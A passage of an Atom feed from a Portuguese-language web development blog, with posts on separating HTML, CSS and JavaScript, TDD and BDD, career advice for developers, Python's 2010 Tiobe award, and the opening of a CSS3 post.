formatação não.&lt;/p&gt;
&lt;p&gt;Com o &lt;a href="https://klauslaube.com.br/tag/css3.html" title="Leia mais sobre CSS3"&gt;&lt;em&gt;CSS&lt;/em&gt;&lt;/a&gt; e as folhas de estilos, aplicar diferentes formatações
para um mesmo conteúdo passou a ser trivial. Antes, quando você tinha a
formatação mesclada a informação, você era obrigado a reescrever a
informação para diferentes formatos.&lt;/p&gt;
&lt;p&gt;Outro exemplo, meu leitor &lt;a href="https://klauslaube.com.br/2010/11/12/o-que-e-rss.html" title="O que é RSS?"&gt;&lt;em&gt;RSS&lt;/em&gt;&lt;/a&gt; não utiliza a formatação que eu
escrevi para o meu &lt;em&gt;site&lt;/em&gt; … ele utiliza uma formatação própria. Estamos
permitindo que nossa informação seja propagada em uma espécie de
“acoplamento fraco”. Para o pessoal que curte uma &lt;em&gt;buzzword&lt;/em&gt;, essa é a
premissa da &lt;em&gt;Web 3.0&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;Interação e comportamento&lt;/h2&gt;
&lt;p&gt;&lt;img class="align-left" src="/images/blog/js-icon.png" width="180" height="180" title="Ícone representando documento Javascript" alt="Ícone representando documento Javascript"&gt;&lt;/p&gt;
&lt;p&gt;O &lt;a href="https://klauslaube.com.br/tag/javascript.html" title="Leia mais sobre Javascript"&gt;&lt;em&gt;Javascript&lt;/em&gt;&lt;/a&gt; é interpretado pelo navegador. Com ele, nossas aplicações &lt;em&gt;web&lt;/em&gt; podem
fazer com que o navegador tenha um comportamento (ou interaja com os
elementos) de uma maneira diferente da usual.&lt;/p&gt;
&lt;p&gt;Por exemplo, podemos fazer uma página inteira ser aberta de forma
assíncrona através de &lt;em&gt;Ajax&lt;/em&gt;, ou podemos fazer com que nossos
formulários sejam validados antes mesmo da informação ser enviada ao
servidor. Você pode notar que fazemos com que o navegador interaja com
nossa informação de uma forma “fora do padrão”… já ouvi pessoas chamando
esta camada de “interação”, outras de “comportamento”. Na minha opinião,
a última opção faz mais sentido.&lt;/p&gt;
&lt;p&gt;Os seus &lt;em&gt;scripts&lt;/em&gt;, assim como os seus estilos, não devem estar
“mesclados” com a informação. Pense comigo, se a informação pode ser
acessada por leitores &lt;em&gt;RSS&lt;/em&gt;, é bem provável que eles não entendam
&lt;em&gt;Javascript&lt;/em&gt; (ou que não entendam na plenitude de um navegador Web).
Certo?&lt;/p&gt;
&lt;h2&gt;Considerações finais&lt;/h2&gt;
&lt;p&gt;Mas afinal de contas, como separo as camadas de desenvolvimento? Muito
simples:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Informação deve ser sempre acessível, indiferente do estilo ou
  comportamento da sua aplicação (ou seja, só &lt;em&gt;HTML&lt;/em&gt;)&lt;/li&gt;
&lt;li&gt;Qualquer espécie de formato que você irá aplicar deve estar contido
  em folhas de estilo &lt;em&gt;CSS&lt;/em&gt; (ou seja, fontes, tamanhos, cores)&lt;/li&gt;
&lt;li&gt;&lt;em&gt;Javascript&lt;/em&gt; não devem estar misturados com &lt;em&gt;HTML&lt;/em&gt;! Nem mesmo em
  atributos como &lt;em&gt;onClick&lt;/em&gt; (com a &lt;em&gt;jQuery&lt;/em&gt; isso se torna muito fácil)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Sei muito bem que na prática a coisa pode não ser bem assim. Os
navegadores estão preparados para lidar com esse tipo de situação, mas
não caia nessa! Separar o seu desenvolvimento em camadas só faz bem para
você, para o seu cliente e para a sociedade.&lt;/p&gt;</content><category term="desenvolvimento"></category><category term="web"></category><category term="html"></category><category term="css"></category><category term="javascript"></category><category term="acessibilidade"></category></entry><entry><title>BDD: Desenvolvimento Orientado a Comportamento</title><link href="https://klauslaube.com.br/2011/02/02/bdd-desenvolvimento-orientado-comportamento.html" rel="alternate"></link><published>2011-02-02T12:48:00-02:00</published><updated>2011-02-02T12:48:00-02:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2011-02-02:/2011/02/02/bdd-desenvolvimento-orientado-comportamento.html</id><summary type="html">&lt;p&gt;Esse post foi originalmente escrito para o &lt;a href="http://www.profissionaisti.com.br/" title="Artigos sobre Tecnologia da Informação"&gt;&lt;em&gt;Profissionais TI&lt;/em&gt;&lt;/a&gt;, você
pode conferi-lo na &lt;a href="http://www.profissionaisti.com.br/2010/01/bdd-desenvolvimento-orientado-a-comportamento/" title="BDD: Desenvolvimento Orientado a Comportamento"&gt;íntegra aqui&lt;/a&gt;.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;No &lt;a href="https://klauslaube.com.br/2011/01/27/tdd-desenvolvimento-orientado-testes.html" title="TDD: Desenvolvimento Orientado a Testes"&gt;&lt;em&gt;post&lt;/em&gt; anterior&lt;/a&gt;, introduzi o conceito de &lt;a href="https://klauslaube.com.br/tag/tdd.html"&gt;&lt;em&gt;TDD&lt;/em&gt;&lt;/a&gt;. Mas para
relembrar, utilizando a prática “baby steps” temos os seguintes
procedimentos:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Escreva um teste que falhe;&lt;/li&gt;
&lt;li&gt;Escreva um código (rudimentar) para o teste;&lt;/li&gt;
&lt;li&gt;Faça o teste …&lt;/li&gt;&lt;/ul&gt;</summary><content type="html">&lt;p&gt;Esse post foi originalmente escrito para o &lt;a href="http://www.profissionaisti.com.br/" title="Artigos sobre Tecnologia da Informação"&gt;&lt;em&gt;Profissionais TI&lt;/em&gt;&lt;/a&gt;, você
pode conferi-lo na &lt;a href="http://www.profissionaisti.com.br/2010/01/bdd-desenvolvimento-orientado-a-comportamento/" title="BDD: Desenvolvimento Orientado a Comportamento"&gt;íntegra aqui&lt;/a&gt;.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;No &lt;a href="https://klauslaube.com.br/2011/01/27/tdd-desenvolvimento-orientado-testes.html" title="TDD: Desenvolvimento Orientado a Testes"&gt;&lt;em&gt;post&lt;/em&gt; anterior&lt;/a&gt;, introduzi o conceito de &lt;a href="https://klauslaube.com.br/tag/tdd.html"&gt;&lt;em&gt;TDD&lt;/em&gt;&lt;/a&gt;. Mas para
relembrar, utilizando a prática “baby steps” temos os seguintes
procedimentos:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Escreva um teste que falhe;&lt;/li&gt;
&lt;li&gt;Escreva um código (rudimentar) para o teste;&lt;/li&gt;
&lt;li&gt;Faça o teste passar;&lt;/li&gt;
&lt;li&gt;Deixe o código “cheirando bem” (&lt;em&gt;refactoring&lt;/em&gt;);&lt;/li&gt;
&lt;li&gt;Volte para o primeiro procedimento.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;O &lt;em&gt;TDD&lt;/em&gt; é focado em testes unitários, onde você isola um modelo (por
exemplo) e monta-o de acordo com os testes que você escrever. Quando
você tiver um determinado número de modelos, aí você testa a integração
entre eles, e assim por diante.&lt;/p&gt;
&lt;p&gt;Fazendo uma analogia, isso é mais ou menos como construir o &lt;em&gt;software&lt;/em&gt;
&lt;strong&gt;“de dentro para fora”&lt;/strong&gt;, onde partimos escrevendo testes específicos
(unitários) e depois vamos abrangendo outras regiões do sistema
(integração, funcional, aceitação, etc). Já em &lt;em&gt;BDD&lt;/em&gt; (&lt;em&gt;Behavior-Driven
Development&lt;/em&gt;) podemos dizer que o &lt;em&gt;software&lt;/em&gt; é desenvolvido &lt;strong&gt;“de fora
para dentro”&lt;/strong&gt;, onde os testes são construídos baseados nos requisitos
do cliente ou em um roteiro de aceitação (também conhecidos por
estórias).&lt;/p&gt;
&lt;p&gt;Esta prática é semelhante ao &lt;em&gt;TDD&lt;/em&gt;: &lt;strong&gt;testes são escritos primeiro,
funções depois&lt;/strong&gt;; O diferencial está que &lt;em&gt;BDD&lt;/em&gt; aborda o
&lt;strong&gt;comportamento&lt;/strong&gt; e o resultado como um todo, não preocupando-se
necessariamente com as classes, métodos e atributos de forma isolada.&lt;/p&gt;
&lt;h2&gt;Mas então qual usar? TDD ou BDD?&lt;/h2&gt;
&lt;p&gt;Essa era a minha dúvida. E demorou até cair a ficha&lt;/p&gt;
&lt;p&gt;Depois de uma boa conversa com o &lt;a href="http://twitter.com/andrewsmedina" title="Siga o Andrews no Twitter."&gt;&lt;em&gt;@andrewsmedina&lt;/em&gt;&lt;/a&gt; (hoje já faz um
tempo que esta conversa aconteceu (: ), captei que pode-se utilizar os
dois! Claro! Garanta que a aplicação está indo de acordo com o teste de
aceitação escrito, e garanta que a escrita de determinada classe esteja
de acordo com os testes unitários criados.&lt;/p&gt;
&lt;p&gt;Geralmente trabalho com testes automatizados da seguinte maneira:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Escrevo estórias para determinada tarefa;&lt;/li&gt;
&lt;li&gt;Escrevo estas estórias em forma de testes. Estes testes podem ser
  classificados como funcionais (no meu caso testo as &lt;em&gt;views&lt;/em&gt; do
  &lt;a href="https://klauslaube.com.br/tag/django.html" title="Leia mais sobre Django"&gt;&lt;em&gt;Django&lt;/em&gt;&lt;/a&gt;, mas isso pode variar de acordo com a aplicação);&lt;/li&gt;
&lt;li&gt;E através de “baby step” e &lt;em&gt;unit&lt;/em&gt;, crio testes isolados para os
  modelos, formulários, &lt;em&gt;views&lt;/em&gt;, etc.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Testes de comportamento tendem a levar mais tempo para serem executados,
esta é outra razão para termos sempre em mãos os testes unitários.&lt;/p&gt;
&lt;p&gt;Até hoje não ví uma maneira “silver bullet” de trabalhar com testes
automatizados. Encaro da seguinte maneira:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Está cobrindo o teu sistema?&lt;/li&gt;
&lt;li&gt;Está guiando de forma correta o seu desenvolvimento?&lt;/li&gt;
&lt;li&gt;Está sendo escrito da forma correta (não deixando &lt;em&gt;bugs&lt;/em&gt; passarem
  despercebidos, por exemplo)?&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Se todas as respostas forem sim, acredito que esteja sendo feito da
maneira adequada.&lt;/p&gt;
&lt;h2&gt;Referências&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://logbr.reflectivesurface.com/2008/10/27/algumas-consideracoes-sobre-tdd-e-bdd/" title="Leia mais no Superfície Reflexiva."&gt;&lt;em&gt;Superfície Reflexiva&lt;/em&gt; - Algumas considerações sobre &lt;em&gt;TDD&lt;/em&gt; e
  &lt;em&gt;BDD&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://portalarquiteto.blogspot.com/2008/02/automao-de-testes-funcionais-e-de.html" title="Leia mais no Portal do Arquiteto."&gt;&lt;em&gt;Portal do Arquiteto&lt;/em&gt; - Automação de testes funcionais e de
  aceitação&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.aprendendodjango.com/programando-com-testes-automatizados/" title="Leia mais no Aprendendo Django."&gt;&lt;em&gt;Aprendendo Django no Planeta Terra&lt;/em&gt; - Programando com Testes
  Automatizados&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.slideshare.net/cmilfont/mare-de-agilidade-bdd-e-tdd" title="Veja a apresentação no Slideshare."&gt;&lt;em&gt;Maré de Agilidade&lt;/em&gt;: &lt;em&gt;BDD&lt;/em&gt; e &lt;em&gt;TDD&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.dtsato.com/blog/work/introduzindo_desenvolvimento_orientado_comportamento_bdd/" title="Leia mais no blog do Sato."&gt;&lt;em&gt;Danilo Sato&lt;/em&gt; - Introduzindo Desenvolvimento Orientado por
  Comportamento&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><category term="desenvolvimento"></category><category term="testes"></category><category term="bdd"></category><category term="agile"></category></entry><entry><title>TDD: Desenvolvimento Orientado a Testes</title><link href="https://klauslaube.com.br/2011/01/27/tdd-desenvolvimento-orientado-testes.html" rel="alternate"></link><published>2011-01-27T11:30:00-02:00</published><updated>2011-01-27T11:30:00-02:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2011-01-27:/2011/01/27/tdd-desenvolvimento-orientado-testes.html</id><summary type="html">&lt;p&gt;Esse post foi originalmente escrito para o &lt;a href="http://www.profissionaisti.com.br/" title="Tudo sobre Tecnologia! ProfissionaisTI"&gt;&lt;em&gt;Profissionais TI&lt;/em&gt;&lt;/a&gt;, você
pode conferi-lo na &lt;a href="http://www.profissionaisti.com.br/2009/11/tdd-desenvolvimento-orientado-a-testes/" title="TDD: Desenvolvimento Orientado a Testes"&gt;íntegra aqui&lt;/a&gt;.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;&lt;strong&gt;O caos!&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Hoje em dia o &lt;a href="https://klauslaube.com.br/tag/agile.html" title="Leia mais sobre Agile"&gt;&lt;em&gt;agile&lt;/em&gt;&lt;/a&gt; passou de uma “técnica anarquista” para uma
saborosa realidade, principalmente nas &lt;em&gt;startups&lt;/em&gt; de tecnologia.&lt;/p&gt;
&lt;p&gt;Uma das características de qualquer método ou ferramenta &lt;em&gt;agile&lt;/em&gt; é que:
&lt;strong&gt;Qualidade não é …&lt;/strong&gt;&lt;/p&gt;</summary><content type="html">&lt;p&gt;Esse post foi originalmente escrito para o &lt;a href="http://www.profissionaisti.com.br/" title="Tudo sobre Tecnologia! ProfissionaisTI"&gt;&lt;em&gt;Profissionais TI&lt;/em&gt;&lt;/a&gt;, você
pode conferi-lo na &lt;a href="http://www.profissionaisti.com.br/2009/11/tdd-desenvolvimento-orientado-a-testes/" title="TDD: Desenvolvimento Orientado a Testes"&gt;íntegra aqui&lt;/a&gt;.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;&lt;strong&gt;O caos!&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Hoje em dia o &lt;a href="https://klauslaube.com.br/tag/agile.html" title="Leia mais sobre Agile"&gt;&lt;em&gt;agile&lt;/em&gt;&lt;/a&gt; passou de uma “técnica anarquista” para uma
saborosa realidade, principalmente nas &lt;em&gt;startups&lt;/em&gt; de tecnologia.&lt;/p&gt;
&lt;p&gt;Uma das características de qualquer método ou ferramenta &lt;em&gt;agile&lt;/em&gt; é que:
&lt;strong&gt;Qualidade não é negociável&lt;/strong&gt;; Como podemos garantir que ao final de
cada ciclo de entregas estamos entregando uma solução que atenda escopo,
prazo e também qualidade?&lt;/p&gt;
&lt;h2&gt;Test first&lt;/h2&gt;
&lt;p&gt;Metodologias ágeis como o &lt;a href="https://klauslaube.com.br/tag/scrum.html" title="Leia mais sobre Scrum"&gt;&lt;em&gt;Scrum&lt;/em&gt;&lt;/a&gt; e o &lt;em&gt;XP&lt;/em&gt; adotam a técnica “Test
First”:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Primeiro escreva um teste que falhe&lt;/li&gt;
&lt;li&gt;Depois escreva um código que faça o teste passar&lt;/li&gt;
&lt;li&gt;Melhore o código escrito&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img class="align-left" src="/images/blog/red-green-refactor.png" title="Red, Green, Refactor!" alt="Red, Green, Refactor!"&gt;&lt;/p&gt;
&lt;p&gt;Além da garantia de que sua aplicação irá
funcionar após uma atualização ou &lt;em&gt;bugfix&lt;/em&gt;, devemos levar em conta que
estamos indo além do simples ato de testar. É nisso que muita gente se
confunde quando fala-se em &lt;a href="https://klauslaube.com.br/tag/tdd.html" title="Leia mais sobre TDD"&gt;&lt;em&gt;Test-Driven Development&lt;/em&gt;&lt;/a&gt;: Não trata-se
apenas de testes, trata-se de design!&lt;/p&gt;
&lt;p&gt;Os testes passam a ser a sua especificação, passam a ser a forma de você
medir se o seu &lt;em&gt;software&lt;/em&gt; está sendo conduzido para o real objetivo ou
não. Literalmente, os &lt;strong&gt;testes guiam o seu desenvolvimento&lt;/strong&gt; – mas isso
não garante que a solução como um todo esteja funcional, por isso é
necessário uma pitada de bom senso (como em tudo na vida).&lt;/p&gt;
&lt;p&gt;Quando você menos espera, a construção dos testes automatizados passou
de “testes” para “desenvolvimento”. Ou seja, esse método irá fazer parte
do processo de construção de código e você começará a medir qualquer
estimativa referente a codificação com os testes inclusos, naturalmente.&lt;/p&gt;
&lt;p&gt;A &lt;em&gt;web&lt;/em&gt; está repleta de artigos sobre como construir estes testes, como
executá-los, etc. Então, não vou ficar repetindo o que o &lt;em&gt;Google&lt;/em&gt; pode
responder.&lt;/p&gt;
&lt;h2&gt;Automatizar = Agilidade?&lt;/h2&gt;
&lt;p&gt;Mas porque &lt;em&gt;TDD&lt;/em&gt; ajuda tanto? Será que vale a pena praticar?&lt;/p&gt;
&lt;p&gt;Quando comecei a programar orientado a objetos, tinha em mente que
aquilo era só curiosidade, que no modo estruturado estava muito bom e
não via a real utilidade daquilo tudo. Claro, isso até ser completamente
envolvido por &lt;em&gt;OOP&lt;/em&gt;, e quando me dei conta não sabia mais viver sem ele.&lt;/p&gt;
&lt;p&gt;Agora já posso dizer o mesmo de &lt;em&gt;TDD&lt;/em&gt;. O prazer de construirmos
orientados a testes, através de um processo &lt;em&gt;baby-steps&lt;/em&gt;, é desafiador…
voltei a acreditar que posso fazer &lt;em&gt;software&lt;/em&gt; bom e de qualidade, pois:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;A taxa de acerto é alta&lt;/li&gt;
&lt;li&gt;A ocorrência de erros diminui&lt;/li&gt;
&lt;li&gt;Você ganha confiança no que está produzindo&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Mesmo que você perca tempo não previsto no desenvolvimento, poupa tempo
(espero eu que) previsto nos testes. No começo a performance do
desenvolvedor cai significativamente… mas com o tempo irá tornar-se uma
prática para dar maior segurança em relação a qualidade do seu
&lt;em&gt;software&lt;/em&gt;, e também dar maior segurança a você.&lt;/p&gt;</content><category term="desenvolvimento"></category><category term="testes"></category><category term="tdd"></category><category term="agile"></category></entry><entry><title>Desenvolvedores: 5 conselhos que para mim funcionaram!</title><link href="https://klauslaube.com.br/2011/01/24/desenvolvedores-5-conselhos-para-mim-funcionaram.html" rel="alternate"></link><published>2011-01-24T12:00:00-02:00</published><updated>2011-01-24T12:00:00-02:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2011-01-24:/2011/01/24/desenvolvedores-5-conselhos-para-mim-funcionaram.html</id><summary type="html">&lt;p&gt;Este post foi originalmente escrito para o &lt;a href="http://www.profissionaisti.com.br/" title="Profissionais TI"&gt;&lt;em&gt;Profissionais TI&lt;/em&gt;&lt;/a&gt;, você
pode conferí-lo na íntegra &lt;a href="http://www.profissionaisti.com.br/2009/10/developers-5-conselhos-que-para-mim-funcionaram/" title="Developers: 5 conselhos que para mim funcionaram"&gt;aqui&lt;/a&gt;.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;h2&gt;1 - Mantenha-se atualizado&lt;/h2&gt;
&lt;p&gt;&lt;a href="http://skoob.com.br/usuario/118855" title="Acompanhe o que eu ando lendo no Skoob"&gt;&lt;em&gt;Livros&lt;/em&gt;&lt;/a&gt;, &lt;a href="https://klauslaube.com.br/feed/rss.xml" title="Assine o nosso Feed RSS"&gt;&lt;em&gt;RSS&lt;/em&gt;&lt;/a&gt;, &lt;a href="http://www.twitter.com/kplaube" title="Acompanhe o que ando dizendo no Twitter"&gt;&lt;em&gt;Twitter&lt;/em&gt;&lt;/a&gt;, &lt;em&gt;Blogs&lt;/em&gt;, &lt;em&gt;Wikis&lt;/em&gt;, etc. A
informação está em todo o lugar, não há mais desculpas para não
manter-se atualizado.&lt;/p&gt;
&lt;p&gt;As assinaturas &lt;em&gt;RSS&lt;/em&gt; têm me mantido atualizado sobre os mais variados …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Este post foi originalmente escrito para o &lt;a href="http://www.profissionaisti.com.br/" title="Profissionais TI"&gt;&lt;em&gt;Profissionais TI&lt;/em&gt;&lt;/a&gt;, você
pode conferí-lo na íntegra &lt;a href="http://www.profissionaisti.com.br/2009/10/developers-5-conselhos-que-para-mim-funcionaram/" title="Developers: 5 conselhos que para mim funcionaram"&gt;aqui&lt;/a&gt;.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;h2&gt;1 - Mantenha-se atualizado&lt;/h2&gt;
&lt;p&gt;&lt;a href="http://skoob.com.br/usuario/118855" title="Acompanhe o que eu ando lendo no Skoob"&gt;&lt;em&gt;Livros&lt;/em&gt;&lt;/a&gt;, &lt;a href="https://klauslaube.com.br/feed/rss.xml" title="Assine o nosso Feed RSS"&gt;&lt;em&gt;RSS&lt;/em&gt;&lt;/a&gt;, &lt;a href="http://www.twitter.com/kplaube" title="Acompanhe o que ando dizendo no Twitter"&gt;&lt;em&gt;Twitter&lt;/em&gt;&lt;/a&gt;, &lt;em&gt;Blogs&lt;/em&gt;, &lt;em&gt;Wikis&lt;/em&gt;, etc. A
informação está em todo o lugar, não há mais desculpas para não
manter-se atualizado.&lt;/p&gt;
&lt;p&gt;As assinaturas &lt;em&gt;RSS&lt;/em&gt; têm me mantido atualizado sobre os mais variados
assuntos sem necessitar ficar perdendo a manhã inteira pulando de &lt;em&gt;blog&lt;/em&gt;
em &lt;em&gt;blog&lt;/em&gt;. Isso é magnífico, já que em 30 mins ou no máximo 1 hora sou
capaz de me manter informado sobre os assuntos que realmente me
interessam e que fazem a diferença no meu ambiente profissional.&lt;/p&gt;
&lt;p&gt;Descobrí no &lt;em&gt;Twitter&lt;/em&gt; uma forma ultra-rápida de me manter atualizado:
sigo pessoas relevantes que estão a todo instante postando &lt;em&gt;links&lt;/em&gt;
interessantes, discutindo assuntos interessantes, nos informando o que
estão fazendo; Obviamente existe toda a parte descartável, mas não
estamos totalmente imunes a isto.&lt;/p&gt;
&lt;h2&gt;2 - Seja aberto a novidades&lt;/h2&gt;
&lt;p&gt;Pode parecer bobagem, mas conheço gente que simplesmente se isola do
mundo com medo de novidades.&lt;/p&gt;
&lt;p&gt;Creio que isso esteja relacionado ao “medo da mudança”. Quando atingimos
uma zona de conforto, precisamos de muito estímulo para deixá-la. Isso é
fato, é em momentos de crise que a humanidade mais se desenvolve. É em
momentos de crise que os profissionais são obrigados a deixar sua zona
de conforto.&lt;/p&gt;
&lt;p&gt;Não vejo nada de errado em ser saudosista, mas seja um saudosista
moderado. Novos modos de fazer tecnologia estão aparecendo e estão
caindo no gosto de muito “peixe grande” da informática.&lt;/p&gt;
&lt;h2&gt;3 - Networking é bom&lt;/h2&gt;
&lt;p&gt;Participe de listas de discussões! Tenha um &lt;em&gt;Twitter&lt;/em&gt;! Tenha um
Mensageiro Instantâneo! Participe de salas do &lt;em&gt;IRC&lt;/em&gt;!&lt;/p&gt;
&lt;p&gt;Eu participo de listas de discussões e posso dizer que já salvaram a
minha vida algumas vezes. Quando eles não conseguem resolver, sou
obrigado a partir pro &lt;em&gt;IRC&lt;/em&gt;, onde existem pessoas muito inteligentes
dispostas a lhe ajudar.&lt;/p&gt;
&lt;p&gt;E quando isso não resolve, o jeito é partir pra lista de contatos do seu
e-mail ou mensageiro instantâneo.&lt;/p&gt;
&lt;p&gt;Mas, além disso tudo eu recomendo: o &lt;em&gt;face-to-face&lt;/em&gt; é a melhor forma de
resolver seus problemas; Tenha “contatos de carne e osso”!&lt;/p&gt;
&lt;h2&gt;4 - Humildade, ou “sempre tem um peixe maior”&lt;/h2&gt;
&lt;p&gt;E isso envolve &lt;em&gt;EGO&lt;/em&gt;, ou o ato de não deixá-lo do tamanho de um
elefante.&lt;/p&gt;
&lt;p&gt;Talvez esse tenha sido o maior desafio para mim (e é até hoje): pedir
ajuda; Simplesmente aceitar que o indíviduo é mais capaz do que você em
determinada situação, mas também entender que se ele compartilhar esse
conhecimento com você, ambos serão capazes de executar a função juntos.&lt;/p&gt;
&lt;p&gt;Ser humilde é um ato que atrai mais pessoas ao seu redor. Atraia pessoas
inteligentes… isso só fará bem a você.&lt;/p&gt;
&lt;h2&gt;5 - Colabore / Compartilhe&lt;/h2&gt;
&lt;p&gt;E além de pedir ajuda, ajude! &lt;a href="http://www.profissionaisti.com.br/colabore" title="Colabore com o Profissionais TI"&gt;Compartilhe o seu &lt;em&gt;know-how&lt;/em&gt;&lt;/a&gt; sobre
alguma linguagem, ferramenta ou prática.&lt;/p&gt;
&lt;p&gt;Penso da seguinte maneira: Quanto mais gente utilizar a mesma técnica
que você, mais ela se tornará conhecida, e igualmente se tornará mais
forte.&lt;/p&gt;
&lt;p&gt;Nem vou mencionar sobre &lt;em&gt;Software&lt;/em&gt; Livre, &lt;em&gt;Open Source&lt;/em&gt;, etc. Não
trata-se do &lt;em&gt;software&lt;/em&gt; rodando naquela máquina, trata-se do conhecimento
investido e adquirido, e o fato desse conhecimento poder ser propagado.&lt;/p&gt;</content><category term="profissao"></category><category term="desenvolvimento"></category><category term="midias-sociais"></category></entry><entry><title>Tiobe elege o Python como a linguagem de programação de 2010</title><link href="https://klauslaube.com.br/2011/01/11/tiobe-elege-python-como-linguagem-de-programacao.html" rel="alternate"></link><published>2011-01-11T12:16:00-02:00</published><updated>2011-01-11T12:16:00-02:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2011-01-11:/2011/01/11/tiobe-elege-python-como-linguagem-de-programacao.html</id><summary type="html">&lt;p&gt;Não é de hoje que &lt;a href="https://klauslaube.com.br/tag/python.html" title="Leia mais sobre Python"&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt; conquistou o
respeito dos mais diversos entusiastas do mercado de Tecnologia da
Informação de todo o mundo… e era questão de tempo para que esse
reconhecimento fosse “sacramentado”.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;O &lt;a href="http://henriquebastos.net/2011/01/09/python-e-eleito-a-linguagem-de-2010/" title="Python é eleito a linguagem de 2010"&gt;&lt;em&gt;Henrique Bastos&lt;/em&gt;&lt;/a&gt; divulgou na &lt;a href="http://groups.google.com/group/django-brasil" title="Grupo de discussão Django Brasil"&gt;lista de discussão do &lt;em&gt;Django&lt;/em&gt;&lt;/a&gt; a
notícia que a &lt;a href="http://www.tiobe.com/index.php/content/paperinfo/tpci/index.html" title="January Headline: Python wins the TIOBE Programming Language Award of 2010!"&gt;&lt;em&gt;Tiobe&lt;/em&gt; elegeu …&lt;/a&gt;&lt;/p&gt;</summary><content type="html">&lt;p&gt;Não é de hoje que &lt;a href="https://klauslaube.com.br/tag/python.html" title="Leia mais sobre Python"&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt; conquistou o
respeito dos mais diversos entusiastas do mercado de Tecnologia da
Informação de todo o mundo… e era questão de tempo para que esse
reconhecimento fosse “sacramentado”.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;O &lt;a href="http://henriquebastos.net/2011/01/09/python-e-eleito-a-linguagem-de-2010/" title="Python é eleito a linguagem de 2010"&gt;&lt;em&gt;Henrique Bastos&lt;/em&gt;&lt;/a&gt; divulgou na &lt;a href="http://groups.google.com/group/django-brasil" title="Grupo de discussão Django Brasil"&gt;lista de discussão do &lt;em&gt;Django&lt;/em&gt;&lt;/a&gt; a
notícia que a &lt;a href="http://www.tiobe.com/index.php/content/paperinfo/tpci/index.html" title="January Headline: Python wins the TIOBE Programming Language Award of 2010!"&gt;&lt;em&gt;Tiobe&lt;/em&gt; elegeu o &lt;em&gt;Python&lt;/em&gt; como linguagem de 2010&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;O &lt;em&gt;Python&lt;/em&gt; agora ocupa a quinta colocação da tabela da &lt;em&gt;Tiobe&lt;/em&gt;, atrás
somente de &lt;em&gt;Java&lt;/em&gt;, &lt;em&gt;C&lt;/em&gt;, &lt;em&gt;C++&lt;/em&gt; e &lt;a href="https://klauslaube.com.br/tag/php.html" title="Leia mais sobre PHP"&gt;&lt;em&gt;PHP&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;O sucesso deve-se desde a rica documentação, até as excepcionais
&lt;em&gt;frameworks&lt;/em&gt; que tornam a linguagem uma das ferramentas modernas mais
poderosas (e ágeis) para desenvolvimento de &lt;em&gt;software&lt;/em&gt;.&lt;/p&gt;</content><category term="noticias"></category><category term="tiobe"></category><category term="python"></category></entry><entry><title>CSS3: Cantos arredondados, sombras e degradês até no IE</title><link href="https://klauslaube.com.br/2010/12/27/css3-cantos-arredondados-sombras-degrades-ate.html" rel="alternate"></link><published>2010-12-27T13:00:00-02:00</published><updated>2010-12-27T13:00:00-02:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2010-12-27:/2010/12/27/css3-cantos-arredondados-sombras-degrades-ate.html</id><summary type="html">&lt;p&gt;Enquanto o &lt;a href="https://klauslaube.com.br/2010/11/13/usando-html5-sem-medo.html" title="Usando o HTML5 sem medo"&gt;movimento em prol do HTML5 ganha cada vez mais força&lt;/a&gt;, o
que podemos falar do &lt;a href="https://klauslaube.com.br/tag/css3.html" title="Leia mais sobre CSS3"&gt;&lt;em&gt;CSS3&lt;/em&gt;&lt;/a&gt;?&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Para a nossa felicidade, &lt;em&gt;Opera&lt;/em&gt;, &lt;em&gt;Safari&lt;/em&gt;, &lt;em&gt;Google Chrome&lt;/em&gt;, &lt;em&gt;Firefox&lt;/em&gt; e
(o polêmico) &lt;em&gt;IE9&lt;/em&gt; já apresentam (ou apresentarão, no caso do &lt;em&gt;IE&lt;/em&gt;) bom
